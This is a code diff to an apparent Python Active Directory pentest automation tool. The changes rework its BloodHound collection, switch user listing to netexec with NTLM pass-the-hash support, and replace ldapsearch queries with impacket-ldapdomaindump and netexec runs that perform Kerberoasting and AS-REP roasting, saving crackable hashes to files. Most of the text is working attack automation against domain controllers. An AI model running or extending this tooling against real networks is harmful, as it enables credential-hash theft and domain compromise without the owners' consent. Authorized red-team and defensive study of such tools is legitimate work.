@@ -147,21 +147,52 @@ def _auth_args(cfg):
 # ---------------------------------------------------------------------------
 def run_bloodhound(cfg):
     _info("Running bloodhound-python (full collection)...")
-    out_file = os.path.join(cfg["raw_dir"], "bloodhound.log")
+    log_file = os.path.join(cfg["raw_dir"], "bloodhound.log")
+
+    # bloodhound-python drops the ZIP in cwd — run it from raw_dir
     cmd = [
         "bloodhound-python",
         "-d", cfg["domain"],
         "-u", cfg["user"],
         "-ns", cfg["dc_ip"],
+        "-dc", cfg["dc_ip"],
         "-c", "All",
         "--zip",
-        "--outputdir", cfg["raw_dir"],
+        "--dns-tcp",
     ]
     if cfg["ntlm"]:
         cmd += ["--hashes", cfg["ntlm"]]
     else:
         cmd += ["-p", cfg["password"]]
-    return _run(cmd, out_file, timeout=300)
+
+    _info(f"Running: {' '.join(cmd)}")
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True, text=True,
+            timeout=300, errors="ignore",
+            cwd=cfg["raw_dir"]   # ZIP drops here
+        )
+        output = result.stdout + result.stderr
+        with open(log_file, "w") as f:
+            f.write(output)
+
+        # Find the ZIP
+        zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
+        if zips:
+            _ok(f"BloodHound ZIP -> {os.path.join(cfg['raw_dir'], zips[0])}")
+        else:
+            _warn("BloodHound ZIP not found — check bloodhound.log for errors")
+            if output:
+                for line in output.splitlines()[-10:]:
+                    print(f"    {C.DIM}{line}{C.RESET}")
+        return output
+    except subprocess.TimeoutExpired:
+        _warn("bloodhound-python timed out")
+        return ""
+    except Exception as e:
+        _err(f"bloodhound-python failed: {e}")
+        return ""
 
 
 def run_kerberoast(cfg):
@@ -188,65 +219,112 @@ def run_asrep(cfg):
 
 
 def _get_users_ldap(cfg, out_file):
-    """Dump user list via ldapsearch for AS-REP roasting."""
+    """Dump user list via netexec for AS-REP roasting."""
     try:
         if cfg["ntlm"]:
-            return
-        result = subprocess.run([
-            "ldapsearch",
-            "-x", "-H", f"ldap://{cfg['dc_ip']}",
-            "-D", f"{cfg['user']}@{cfg['domain']}",
-            "-w", cfg["password"],
-            "-b", _domain_to_dn(cfg["domain"]),
-            "(objectClass=user)",
-            "sAMAccountName"
-        ], capture_output=True, text=True, timeout=30)
-        users = re.findall(r"sAMAccountName: (.+)", result.stdout)
+            auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
+        else:
+            auth = ["-u", cfg["user"], "-p", cfg["password"]]
+
+        result = subprocess.run(
+            ["netexec", "ldap", cfg["dc_ip"]] + auth + ["--users"],
+            capture_output=True, text=True, timeout=30, errors="ignore"
+        )
+        # netexec --users output: lines like "LDAP  ... username  ..."
+        users = re.findall(r"\bLDAP\b.+?\s{2,}(\S+)\s{2,}", result.stdout)
+        if not users:
+            # fallback: grab any word after green/yellow status marker
+            users = re.findall(r"\[\*\]\s+(\S+@\S+|\S+\\\S+|\S+)", result.stdout)
         with open(out_file, "w") as f:
-            f.write("\n".join(users))
-    except Exception:
-        pass
+            f.write("\n".join(set(users)))
+        _ok(f"Got {len(set(users))} users for AS-REP check")
+    except Exception as e:
+        _warn(f"Could not get user list: {e}")
 
 
 def run_ldap_enum(cfg):
-    """Full LDAP enumeration — users, groups, computers, GPOs, password policy."""
+    """
+    Full LDAP enumeration using:
+    1. impacket-ldapdomaindump  — structured dump of all AD objects
+    2. netexec ldap             — targeted queries (kerberoastable, asrep, etc.)
+    """
     out_file = os.path.join(cfg["raw_dir"], "ldap_enum.txt")
-    if cfg["ntlm"]:
-        _warn("LDAP enum with hash not supported via ldapsearch — skipping full LDAP dump.")
-        return ""
-
-    dn   = _domain_to_dn(cfg["domain"])
-    base = ["ldapsearch", "-x", "-H", f"ldap://{cfg['dc_ip']}",
-            "-D", f"{cfg['user']}@{cfg['domain']}", "-w", cfg["password"], "-b", dn]
+    dump_dir = os.path.join(cfg["raw_dir"], "ldapdomaindump")
+    os.makedirs(dump_dir, exist_ok=True)
 
     output = ""
-    queries = {
-        "DOMAIN USERS":     "(objectClass=user)",
-        "DOMAIN GROUPS":    "(objectClass=group)",
-        "DOMAIN COMPUTERS": "(objectClass=computer)",
-        "DOMAIN ADMINS":    "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users," + dn + "))",
-        "KERBEROASTABLE USERS": "(&(objectClass=user)(servicePrincipalName=*))",
-        "ASREP ROASTABLE USERS": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
-        "UNCONSTRAINED DELEGATION": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
-        "CONSTRAINED DELEGATION": "(msDS-AllowedToDelegateTo=*)",
-        "PASSWORD POLICY": "(objectClass=domainDNS)",
-        "DOMAIN CONTROLLERS": "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
-        "GPO LIST": "(objectClass=groupPolicyContainer)",
+
+    # ── impacket-ldapdomaindump ───────────────────────────────────────────
+    _info("Running ldapdomaindump...")
+    if cfg["ntlm"]:
+        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
+    else:
+        ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]
+
+    ldd_cmd = ["impacket-ldapdomaindump"] + ldd_auth + [
+        cfg["dc_ip"],
+        "-o", dump_dir,
+        "--no-html",   # save as .json + .grep (text)
+    ]
+    try:
+        result = subprocess.run(ldd_cmd, capture_output=True, text=True, timeout=120, errors="ignore")
+        ldd_out = result.stdout + result.stderr
+        output += f"=== LDAPDOMAINDUMP ===\n{ldd_out}\n"
+
+        # Parse the .grep files into our section format
+        grep_map = {
+            "domain_users.grep":       "DOMAIN USERS",
+            "domain_groups.grep":      "DOMAIN GROUPS",
+            "domain_computers.grep":   "DOMAIN COMPUTERS",
+            "domain_policy.grep":      "PASSWORD POLICY",
+            "domain_trusts.grep":      "DOMAIN TRUSTS",
+            "domain_controllers.grep": "DOMAIN CONTROLLERS",
+        }
+        for fname, section_name in grep_map.items():
+            fpath = os.path.join(dump_dir, fname)
+            if os.path.exists(fpath):
+                with open(fpath) as f:
+                    content = f.read()
+                output += f"\n=== {section_name} ===\n{content}\n"
+                _ok(f"Parsed {fname}")
+    except Exception as e:
+        _warn(f"ldapdomaindump error: {e}")
+
+    # ── netexec ldap targeted queries ────────────────────────────────────
+    _info("Running netexec ldap targeted queries...")
+
+    if cfg["ntlm"]:
+        nxc_auth = ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
+    else:
+        nxc_auth = ["-u", cfg["user"], "-p", cfg["password"]]
+
+    nxc_base = ["netexec", "ldap", cfg["dc_ip"]] + nxc_auth
+
+    nxc_queries = {
+        "KERBEROASTABLE USERS": ["--kerberoasting", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")],
+        "ASREP ROASTABLE USERS": ["--asreproast", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")],
+        "DOMAIN ADMINS":        ["--groups"],
+        "PASSWORD POLICY":      ["--pass-pol"],
+        "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
+        "ADMIN USERS":          ["--admin-count"],
     }
 
-    for section, filt in queries.items():
+    for section_name, flags in nxc_queries.items():
         try:
             result = subprocess.run(
-                base + [filt],
+                nxc_base + flags,
                 capture_output=True, text=True, timeout=30, errors="ignore"
             )
-            output += f"\n=== {section} ===\n{result.stdout}\n"
-        except Exception:
-            pass
+            section_out = result.stdout + result.stderr
+            output += f"\n=== {section_name} ===\n{section_out}\n"
+            if result.stdout.strip():
+                _ok(f"{section_name} done")
+        except Exception as e:
+            _warn(f"netexec {section_name} failed: {e}")
 
     with open(out_file, "w") as f:
         f.write(output)
-    _ok(f"LDAP enum done -> {out_file}")
+    _ok(f"LDAP enum complete -> {out_file}")
     return output
 
 
